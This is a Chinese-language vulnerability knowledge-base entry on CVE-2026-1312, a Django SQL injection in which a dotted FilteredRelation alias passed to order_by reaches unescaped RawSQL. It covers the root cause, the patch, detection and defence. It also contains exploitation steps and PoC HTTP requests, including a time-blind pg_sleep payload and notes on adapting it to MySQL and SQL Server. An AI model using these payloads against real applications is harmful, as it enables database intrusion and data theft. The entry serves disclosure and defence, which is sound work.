---
id: web-generic-sqli-django-orderby-filteredrelation-period-alias
title: Django CVE-2026-1312：order_by + FilteredRelation 带点别名走 RawSQL 导致 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: django-orderby-filteredrelation-period-alias-sqli
tags:
- python
- django
- orm
- sqli
- filteredrelation
- order_by
- rawsql
- alias
- cve-2026-1312
cve:
- CVE-2026-1312
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V37
  verified_at: '2026-11-05T06:02:22+08:00'
  notes: 已对照原文及16张截图核对：两处补丁（add_filtered_relation 禁点号、_order_by_pairs 要求 extra_order_by）、正常别名 aaa 生成 INNER JOIN、aaa.hi 走 RawSQL 且 JOIN 消失、name=vuln_book.id,pg_sleep(2) 生成 ORDER BY ("vuln_book".id,pg_sleep(2)) 时间盲注，均一致；原文仅给复现环境 Django 5.2.9、未给受影响区间，未臆测版本；PoC 未在本机复跑。
url: /docs/web/generic/sqli/web-generic-sqli-django-orderby-filteredrelation-period-alias/
draft: false
kb_aliases:
- CVE-2026-1312
- Django order_by SQL 注入
- FilteredRelation 点号别名
- RawSQL order_by 注入
- Django 时间盲注
- order_by 别名注入
---

## 一句话结论

Django 在 `order_by()` 中遇到带点号的字段时，会走 `RawSQL` 拼接分支：按第一个点分割表名/列名，只对表名做引号包裹，列名原样拼接；当同一个带点别名又来自用户可控的 `FilteredRelation` 别名时，别名引用计数不会被累加，JOIN 被优化掉，注入串只出现在 `ORDER BY` 中。由于别名校验不禁止点号、括号和逗号，攻击者可构造 `ORDER BY ("vuln_book".id,pg_sleep(2))` 这类合法表达式，实现时间盲注 SQL 注入（CVE-2026-1312）。

## 原理

- **别名来自用户输入**：业务把请求参数作为 `FilteredRelation` 的 alias 传入 `Book.objects.alias(**{crafted: FilteredRelation("author")}).order_by(crafted)`。Django 的 `check_alias()` 会拒绝引号、反引号、方括号、空白、分号、`#`、`--`、`/*`、`*/`，但**不禁止点号、括号和逗号**。
- **带点字段触发 RawSQL 分支**：`SQLCompiler._order_by_pairs()` 中，若 `"." in field`，则 `table, col = col.split(".", 1)`，并生成 `RawSQL("%s.%s" % (quote_name_unless_alias(table), col))`。表名经 `quote_name_unless_alias` 处理，`col` **未经转义直接拼接**。修复前只要字段含点就走该分支；修复后要求该字段必须出现在 `extra_order_by` 中。
- **JOIN 消失，别名只出现一次**：正常别名 `aaa` 会走 `find_ordering_name()` → `setup_joins()` → `table_alias()`，把 `alias_refcount["aaa"]` 加 1，后续 `get_from_clause()` 依据引用计数生成 `INNER JOIN "vuln_author" aaa ON ...`。带点别名走 RawSQL 分支后不会进入上述别名统计流程，引用计数为 0，`get_from_clause()` 直接跳过该 JOIN。于是 SQL 从三处出现别名缩减为只在 `ORDER BY` 出现一次，大幅降低了构造合法注入的难度。
- **ORDER BY 支持表达式/子查询**：生成 `ORDER BY ("vuln_book".id,pg_sleep(2))`，PostgreSQL 会把它当作行表达式/函数调用执行，`pg_sleep(2)` 造成可观测延时。别名中的逗号、括号均未被 `check_alias` 拦截，因此可以把额外 SQL 片段塞进列名位置。
- **补丁双重修复**：`add_filtered_relation()` 增加“别名不得包含点号”的检查；`_order_by_pairs()` 把 RawSQL 分支的条件收紧为 `"." in field and field in self.query.extra_order_by`，防止普通 `order_by` 输入走原生拼接。

## 触发条件

- Django 版本未包含 CVE-2026-1312 修复（原文复现环境为 Django 5.2.9）。
- 应用把外部可控的字符串作为 `FilteredRelation` 的别名（`alias(**{user_input: FilteredRelation(...)})`），并在 `order_by()` 中引用同一个别名。
- 目标数据库支持在 `ORDER BY` 中执行表达式/子查询/函数（原文为 PostgreSQL；其他数据库语法需调整）。
- 别名除 Django 的 `check_alias()` 外没有额外白名单，点号、逗号、括号可进入。
- 应用未关闭详细 SQL 日志/调试页（便于观察生成 SQL；非必需）。

## 利用步骤

1. 找到把用户输入作为 `FilteredRelation` 别名并用于 `order_by` 的接口。
2. 用正常别名 `aaa` 请求，确认生成 SQL 形如 `... INNER JOIN "vuln_author" aaa ON (...) ORDER BY aaa."id" ASC`。
3. 用带点别名 `aaa.hi` 请求，观察 SQL 变为 `... FROM "vuln_book" ORDER BY ("aaa".hi) ASC` —— JOIN 已消失，证明走了 RawSQL 分支；此时可能因缺少 FROM 表报错，但拼接形态已确认。
4. 把别名换成“已存在的表/列 + 逗号 + SQL 函数/子查询”，例如 `vuln_book.id,pg_sleep(2)`，生成 `ORDER BY ("vuln_book".id,pg_sleep(2)) ASC`。
5. 观察响应时间是否增加约 2 秒，确认时间盲注；可替换为布尔条件、报错函数或其它子查询读取数据。
6. 结合数据库类型调整语法（MySQL 可用 `SLEEP()`、`IF()`；SQL Server 用 `WAITFOR` 等），并注意 `check_alias` 仍会拦截空白与注释符，注入片段需保持无空白/无注释。

## PoC

漏洞视图核心：

```python
crafted = request.GET.get("name", "new_name")
relation = FilteredRelation("author")
query = Book.objects.alias(**{crafted: relation}).order_by(crafted)
res = list(query.values_list())
```

正常请求与 SQL：

```http
GET /book/search?name=aaa HTTP/1.1
```

```sql
SELECT "vuln_book"."id", "vuln_book"."title", "vuln_book"."author_id"
FROM "vuln_book"
INNER JOIN "vuln_author" aaa ON ("vuln_book"."author_id" = aaa."id")
ORDER BY aaa."id" ASC
```

带点别名（JOIN 消失）：

```http
GET /book/search?name=aaa.hi HTTP/1.1
```

```sql
SELECT "vuln_book"."id", "vuln_book"."title", "vuln_book"."author_id"
FROM "vuln_book" ORDER BY ("aaa".hi) ASC
```

时间盲注 PoC：

```http
GET /book/search?name=vuln_book.id,pg_sleep(2) HTTP/1.1
```

生成 SQL：

```sql
SELECT "vuln_book"."id", "vuln_book"."title", "vuln_book"."author_id"
FROM "vuln_book" ORDER BY ("vuln_book".id,pg_sleep(2)) ASC
```

原文在 PostgreSQL 上观察到约 2 秒延时，确认注入成功；SQL 日志中可见上述 ORDER BY 表达式。

## 变体与关联

- 变体（数据库）：PostgreSQL 用 `pg_sleep`；MySQL 可尝试 `sleep()`，但 `check_alias` 禁止空白/注释，需构造无空白表达式；其它数据库按 `ORDER BY` 表达式能力调整。
- 变体（注入位置）：带点字段的 RawSQL 分支还可能出现在 `extra(order_by=...)` 场景；修复后该分支要求字段在 `extra_order_by` 中，普通输入被阻断。
- 变体（利用目标）：时间盲注、布尔盲注、报错注入、子查询读取；`ORDER BY` 支持表达式时可嵌入子查询。
- 关联：[[web-generic-sqli-django-filteredrelation-alias]]（CVE-2025-57833：缺少 `check_alias()` 导致别名直接进入 JOIN；本 CVE 是在其修复后，用点号 + RawSQL 分支绕过限制）。
- 关联：[[web-generic-sqli-java-identifier-table-order-by-injection]]（同为标识符/ORDER BY 位置注入）。
- 边界：别名完全由服务端生成或经过严格白名单时不成立；目标数据库不支持 ORDER BY 表达式/子查询时利用受限；补丁版本会拒绝带点别名并收紧 RawSQL 分支。

## 检测与防御

- 修复：升级到包含 CVE-2026-1312 补丁的 Django 版本（补丁同时拒绝 `FilteredRelation` 带点别名，并要求 RawSQL 分支的字段属于 `extra_order_by`）。
- 输入限制：不要用用户输入构造 `**kwargs` 别名或 `order_by` 字段；别名使用 `^[A-Za-z_][A-Za-z0-9_]*$` 白名单；`order_by` 只允许预定义字段/排序选项。
- 纵深防御：ORM 生成 SQL 后做审计；数据库账号最小权限；对 `ORDER BY` 中的函数/子查询做监控。
- 检测：请求参数中出现 `.`、`,`、`(`、`)` 与 `pg_sleep`、`sleep`、`waitfor`、`case when` 等组合，且被用于别名/排序字段；SQL 日志出现 `ORDER BY (<table>.<col>, ...)` 形式的表达式；响应时间异常增加；Django 调试页出现 `missing FROM-clause entry` 等拼接异常。
- 运营：排查所有 `FilteredRelation` + `alias`/`annotate` + `order_by` 组合；升级后回归测试依赖动态别名的业务。
